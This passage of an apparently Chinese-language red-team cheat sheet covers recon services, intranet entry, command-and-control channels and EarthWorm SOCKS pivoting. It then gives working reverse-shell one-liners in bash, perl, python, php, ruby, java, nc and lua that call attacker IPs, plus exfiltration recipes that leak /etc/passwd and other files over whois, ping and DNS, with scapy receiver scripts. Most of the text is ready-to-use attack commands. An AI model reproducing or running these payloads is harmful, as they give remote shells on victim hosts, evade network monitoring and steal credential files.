<li>dnsdb.io :<a href="https://dnsdb.io/zh-cn/search?q=target.com" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/search?q=target.com</a></li>
<li>api.hackertarget.com :<a href="http://api.hackertarget.com/reversedns/?q=target.com" target="_blank" rel="noopener">http://api.hackertarget.com/reversedns/?q=target.com</a></li>
<li>community.riskiq.com :<a href="https://community.riskiq.com/Search/target.com" target="_blank" rel="noopener">https://community.riskiq.com/Search/target.com</a></li>
<li>subdomain3 :<a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a></li>
<li>FuzzDomain :<a href="https://github.com/Chora10/FuzzDomain" target="_blank" rel="noopener">https://github.com/Chora10/FuzzDomain</a></li>
<li>dnsdumpster.com :<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li>
<li>phpinfo.me :<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li>
<li>dns开放数据接口 :<a href="https://dns.bufferover.run/dns?q=baidu.com" target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=baidu.com</a></li>
</ul>
<h2 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h2><h3 id="基于企业弱账号漏洞"><a href="#基于企业弱账号漏洞" class="headerlink" title="基于企业弱账号漏洞"></a>基于企业弱账号漏洞</h3><ul>
<li>VPN（通过邮箱，密码爆破，社工等途径获取VPN） </li>
<li>企业相关运维系统（zabbix等） </li>
</ul>
<h3 id="基于系统漏洞进入"><a href="#基于系统漏洞进入" class="headerlink" title="基于系统漏洞进入"></a>基于系统漏洞进入</h3><ul>
<li>Metasploit(漏洞利用框架):<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a> </li>
<li>漏洞利用脚本 </li>
</ul>
<h3 id="网站应用程序渗透"><a href="#网站应用程序渗透" class="headerlink" title="网站应用程序渗透"></a>网站应用程序渗透</h3><ul>
<li>SQL注入 </li>
<li>跨站脚本（XSS） </li>
<li>跨站请求伪造（CSRF） </li>
<li>SSRF（<a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="noopener">ssrf_proxy</a>） </li>
<li>功能/业务逻辑漏洞 </li>
<li>其他漏洞等 </li>
<li>CMS-内容管理系统漏洞 </li>
<li>企业自建代理 </li>
</ul>
<h3 id="无线Wi-Fi接入"><a href="#无线Wi-Fi接入" class="headerlink" title="无线Wi-Fi接入"></a>无线Wi-Fi接入</h3><h2 id="隐匿攻击"><a href="#隐匿攻击" class="headerlink" title="隐匿攻击"></a>隐匿攻击</h2><h3 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h3><ul>
<li>ICMP :<a href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/" target="_blank" rel="noopener">https://pentestlab.blog/2017/07/28/command-and-control-icmp/</a></li>
<li>DNS :<a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/06/command-and-control-dns/</a></li>
<li>DropBox :<a href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/29/command-and-control-dropbox/</a></li>
<li>Gmail :<a href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/03/command-and-control-gmail/</a></li>
<li>Telegram :<a href="http://drops.xmd5.com/static/drops/tips-16142.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-16142.html</a></li>
<li>Twitter :<a href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/26/command-and-control-twitter/</a></li>
<li>Website Keyword :<a href="https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/</a></li>
<li>PowerShell :<a href="https://pentestlab.blog/2017/08/19/command-and-control-powershell/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/19/command-and-control-powershell/</a></li>
<li>Windows COM :<a href="https://pentestlab.blog/2017/09/01/command-and-control-windows-com/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/01/command-and-control-windows-com/</a></li>
<li>WebDAV :<a href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/12/command-and-control-webdav/</a></li>
<li>Office 365 :<a href="https://www.anquanke.com/post/id/86974" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86974</a></li>
<li>HTTPS :<a href="https://pentestlab.blog/2017/10/04/command-and-control-https/" target="_blank" rel="noopener">https://pentestlab.blog/2017/10/04/command-and-control-https/</a></li>
<li>Kernel :<a href="https://pentestlab.blog/2017/10/02/command-and-control-kernel/" target="_blank" rel="noopener">https://pentestlab.blog/2017/10/02/command-and-control-kernel/</a></li>
<li>Website :<a href="https://pentestlab.blog/2017/11/14/command-and-control-website/" target="_blank" rel="noopener">https://pentestlab.blog/2017/11/14/command-and-control-website/</a></li>
<li>WMI :<a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="noopener">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>
<li>WebSocket :<a href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/" target="_blank" rel="noopener">https://pentestlab.blog/2017/12/06/command-and-control-websocket/</a></li>
<li>Images :<a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/02/command-and-control-images/</a></li>
<li>Web Interface :<a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/03/command-and-control-web-interface/</a></li>
<li>JavaScript :<a href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/08/command-and-control-javascript/</a></li>
<li>… </li>
</ul>
<h3 id="Fronting"><a href="#Fronting" class="headerlink" title="Fronting"></a>Fronting</h3><ul>
<li><a href="https://evi1cg.me/archives/Domain_Fronting.html" target="_blank" rel="noopener">Domain Fronting </a></li>
<li><a href="https://evi1cg.me/archives/Tor_Fronting.html" target="_blank" rel="noopener">Tor_Fronting.</a></li>
</ul>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><ul>
<li>VPN </li>
<li>shadowsockts :<a href="https://github.com/shadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks</a></li>
<li>HTTP :<a href="http://cn-proxy.com/" target="_blank" rel="noopener">http://cn-proxy.com/</a></li>
<li>Tor </li>
</ul>
<h2 id="内网跨边界应用"><a href="#内网跨边界应用" class="headerlink" title="内网跨边界应用"></a>内网跨边界应用</h2><h3 id="内网跨边界转发"><a href="#内网跨边界转发" class="headerlink" title="内网跨边界转发"></a>内网跨边界转发</h3><ul>
<li><a href="https://blog.csdn.net/l_f0rm4t3d/article/details/24004555" target="_blank" rel="noopener">NC端口转发</a> </li>
<li><a href="http://blog.chinaunix.net/uid-53401-id-4407931.html" target="_blank" rel="noopener">LCX端口转发 </a></li>
<li><a href="https://github.com/cnlh/nps" target="_blank" rel="noopener">nps</a></li>
<li>代理脚本 <ol>
<li><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">Tunna </a></li>
<li><a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">Reduh </a></li>
</ol>
</li>
<li>… </li>
</ul>
<h3 id="内网跨边界代理穿透"><a href="#内网跨边界代理穿透" class="headerlink" title="内网跨边界代理穿透"></a>内网跨边界代理穿透</h3><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a><a href="https://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">EW</a></h4><p>正向 SOCKS v5 服务器:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
<p> 反弹 SOCKS v5 服务器:<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
<p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;ew -s rssocks -d 1.1.1.1 -e 8888</span><br></pre></td></tr></table></figure>
<p>多级级联</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br></pre></td></tr></table></figure>
<p>lcx_tran 的用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;ew -s ssocksd -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>lcx_listen、lcx_slave 的用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s ssocksd -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>“三级级联”的本地SOCKS测试用例以供参考</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line">$ .&#x2F;ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure>
<h4 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a><a href="https://rootkiter.com/Termite/" target="_blank" rel="noopener">Termite</a></h4><p>使用说明:<a href="https://rootkiter.com/Termite/README.txt" target="_blank" rel="noopener">https://rootkiter.com/Termite/README.txt</a> </p>
<h4 id="代理脚本"><a href="#代理脚本" class="headerlink" title="代理脚本"></a>代理脚本</h4><p>reGeorg :<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
<h3 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h3><p>bash  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>perl </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
<p>python </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<p>php </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
<p>ruby </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure>
<p>java </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<p>nc </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#使用-e </span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 223.8.200.234 1234</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#不使用-e</span><br><span class="line">mknod &#x2F;tmp&#x2F;backpipe p</span><br><span class="line">&#x2F;bin&#x2F;sh 0&#x2F;tmp&#x2F;backpipe | nc attackerip listenport 1&gt;&#x2F;tmp&#x2F;backpipe</span><br></pre></td></tr></table></figure>

<p>lua </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>

<h3 id="内网文件的传输和下载"><a href="#内网文件的传输和下载" class="headerlink" title="内网文件的传输和下载"></a>内网文件的传输和下载</h3><p>wput </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wput dir_name ftp:&#x2F;&#x2F;linuxpig:123456@host.com&#x2F;</span><br></pre></td></tr></table></figure>
<p>wget </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;site.com&#x2F;1.rar -O 1.rar</span><br></pre></td></tr></table></figure>
<p>ariac2（需安装） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c -o owncloud.zip https:&#x2F;&#x2F;download.owncloud.org&#x2F;community&#x2F;owncloud-9.0.0.tar.bz2</span><br></pre></td></tr></table></figure>
<p>powershell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$p &#x3D; New-Object System.Net.WebClient </span><br><span class="line">$p.DownloadFile(&quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;,&quot;C:%homepath%file&quot;)</span><br></pre></td></tr></table></figure>
<p>vbs脚本 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args &#x3D; Wscript.Arguments</span><br><span class="line">Url &#x3D; &quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;</span><br><span class="line">dim xHttp: Set xHttp &#x3D; createobject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">dim bStrm: Set bStrm &#x3D; createobject(&quot;Adodb.Stream&quot;)</span><br><span class="line">xHttp.Open &quot;GET&quot;, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">.type &#x3D; 1 &#39;</span><br><span class="line">.open</span><br><span class="line">.write xHttp.responseBody</span><br><span class="line">.savetofile &quot; C:\%homepath%\file&quot;, 2 &#39;</span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行 ：cscript test.vbs</p>
</blockquote>
<p>Perl </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl </span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(&quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;, &quot;file&quot;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：perl test.pl</p>
</blockquote>
<p>Python </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python </span><br><span class="line">import urllib2 </span><br><span class="line">u &#x3D; urllib2.urlopen(&#39;http:&#x2F;&#x2F;domain&#x2F;file&#39;) </span><br><span class="line">localFile &#x3D; open(&#39;local_file&#39;, &#39;w&#39;) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：python test.py</p>
</blockquote>
<p>Ruby </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;ruby</span><br><span class="line">require &#39;net&#x2F;http&#39;</span><br><span class="line">Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|</span><br><span class="line">r &#x3D; http.get(&quot;&#x2F;file&quot;)</span><br><span class="line">open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：ruby test.rb</p>
</blockquote>
<p>PHP </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url  &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#x2F;file&#39;;</span><br><span class="line">$path &#x3D; &#39;&#x2F;path&#x2F;to&#x2F;file&#39;;</span><br><span class="line">$ch &#x3D; curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$data &#x3D; curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">file_put_contents($path, $data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：php test.php</p>
</blockquote>
<p>NC<br>attacker </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
<p>target</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
<p>FTP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file exit</span><br></pre></td></tr></table></figure>
<p>TFTP </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
<p>Bitsadmin </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;domain&#x2F;file c:%homepath%file</span><br></pre></td></tr></table></figure>
<p>Window 文件共享 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share &#x2F;user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
<p>SCP<br>本地到远程 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp file user@host.com:&#x2F;tmp</span><br></pre></td></tr></table></figure>
<p>远程到本地 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp user@host.com:&#x2F;tmp file</span><br></pre></td></tr></table></figure>
<p>rsync<br>远程rsync服务器中拷贝文件到本地机 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av root@192.168.78.192::www &#x2F;databack</span><br></pre></td></tr></table></figure>
<p>本地机器拷贝文件到远程rsync服务器 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av &#x2F;databack root@192.168.78.192::www</span><br></pre></td></tr></table></figure>
<p>certutil.exe </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;site.com&#x2F;file</span><br></pre></td></tr></table></figure>
<p>copy</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\IP\ShareName\file.exe file.exe</span><br></pre></td></tr></table></figure>
<p>WHOIS<br>接收端 Host B：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 1337 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d</span><br></pre></td></tr></table></figure>
<p>发送端 Host A：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois -h host_ip -p 1337 &#96;cat &#x2F;etc&#x2F;passwd | base64&#96;</span><br></pre></td></tr></table></figure>

<p><a href="https://twitter.com/mubix/status/1102780436118409216" target="_blank" rel="noopener">WHOIS + TAR</a><br>First:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it</span><br></pre></td></tr></table></figure>

<p>Next</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar czf - &#x2F;tmp&#x2F;* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits</span><br></pre></td></tr></table></figure>

<p>Finally</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat files.b64 | tr -d &#39;\r\n&#39; | base64 -d | tar zxv #to get the files out</span><br></pre></td></tr></table></figure>

<p>PING<br>发送端:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done</span><br></pre></td></tr></table></figure>
<p>接收端<code>ping_receiver.py</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_packet(pkt):</span><br><span class="line">    if pkt.haslayer(ICMP):</span><br><span class="line">        if pkt[ICMP].type &#x3D;&#x3D; 8:</span><br><span class="line">            data &#x3D; pkt[ICMP].load[-4:]</span><br><span class="line">            print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&quot;&quot;, sep&#x3D;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ping_receiver.py</span><br></pre></td></tr></table></figure>

<p>DIG<br>发送端:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -c 31 &#x2F;etc&#x2F;passwd | while read line; do dig @172.16.1.100 +short +tries&#x3D;1 +time&#x3D;1 $line.gooogle.com; done</span><br></pre></td></tr></table></figure>
<p>接收端<code>dns_reciver.py</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span><br><span class="line"></span><br><span class="line">def process_packet(pkt):</span><br><span class="line">    if pkt.haslayer(DNS):</span><br><span class="line">        domain &#x3D; pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)</span><br><span class="line">        root_domain &#x3D; domain.split(&#39;.&#39;)[1]</span><br><span class="line">        if root_domain.startswith(&#39;gooogle&#39;):</span><br><span class="line">            print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dns_reciver.py</span><br></pre></td></tr></table></figure>
<p>… </p>
<h3 id="搭建-HTTP-server"><a href="#搭建-HTTP-server" class="headerlink" title="搭建 HTTP server"></a>搭建 HTTP server</h3><p>python2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1337</span><br></pre></td></tr></table></figure>
<p>python3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 1337</span><br></pre></td></tr></table></figure>
<p>PHP 5.4+</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:1337</span><br></pre></td></tr></table></figure>
<p>ruby</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port &#x3D;&gt; 1337, :DocumentRoot &#x3D;&gt; Dir.pwd).start&#39;</span><br></pre></td></tr></table></figure>
